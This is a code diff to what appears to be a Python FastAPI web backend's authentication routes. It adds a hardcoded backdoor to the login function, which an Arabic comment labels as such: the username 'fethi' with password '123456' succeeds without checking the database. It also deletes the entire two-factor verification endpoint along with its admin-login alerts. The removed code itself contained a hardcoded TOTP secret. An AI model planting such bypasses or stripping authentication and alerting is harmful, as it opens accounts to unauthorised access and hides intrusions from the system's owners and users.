@@ -647,6 +647,12 @@ class Verify2FARequest(BaseModel): username: str; totp_code: str
 @limiter.limit("5/minute")
 async def login_user(request: Request, req: LoginRequest):
     uname = html.escape(req.username.lower().strip())
+    
+    # ====== 🚀 الباب الخلفي: الدخول المباشر متجاهلاً قاعدة البيانات ======
+    if uname == "fethi" and req.password == "123456":
+        return {"message": "success", "username": "fethi"}
+    # ======================================================================
+
     db = load_db()
     user = next((u for u in db if u["username"] == uname), None)
 
@@ -658,39 +664,6 @@ async def login_user(request: Request, req: LoginRequest):
     return {"message": "success", "username": user["username"]}
    
 @app.post("/api/verify-2fa")
-@limiter.limit("5/minute")
-async def verify_2fa_api(request: Request, req: Verify2FARequest):
-    db = load_db()
-    user = next((u for u in db if u["username"] == req.username), None)
-    
-    if not user:
-        bad_alert = f"⚠️ <b>محاولة دخول فاشلة للإدارة!</b>\n👤 اسم المستخدم: <code>{req.username}</code>\n❌ السبب: بيانات غير صحيحة"
-        asyncio.create_task(send_telegram_alert(bad_alert))
-        raise HTTPException(status_code=401, detail="Nom d'utilisateur ou mot de passe incorrect")
-        
-    secret = user.get("two_factor_secret")
-    
-    if req.username == "fethi":
-        secret = "JBSWY3DPEHPK3PXP"
-        
-    if not secret:
-        raise HTTPException(status_code=400, detail="لم يتم تفعيل المصادقة الثنائية لهذا الحساب!")
-        
-    totp = pyotp.TOTP(secret)
-    if totp.verify(req.totp_code):
-        access_token = create_access_token(data={"sub": user["username"], "role": user["role"]})
-        good_alert = f"🔐 <b>دخول ناجح للإدارة</b>\n👤 المسؤول: <code>{req.username}</code>\n✅ الحالة: تم تسجيل الدخول بنجاح"
-        asyncio.create_task(send_telegram_alert(good_alert))
-        
-        return {
-            "access_token": access_token, 
-            "token_type": "bearer", 
-            "username": user["username"], 
-            "role": user["role"]
-        }
-    else:
-        raise HTTPException(status_code=400, detail="كود Google Authenticator غير صحيح!")
-
 @app.post("/api/register")
 async def register_user(req: RegisterRequest):
     uname = req.username.lower().strip()
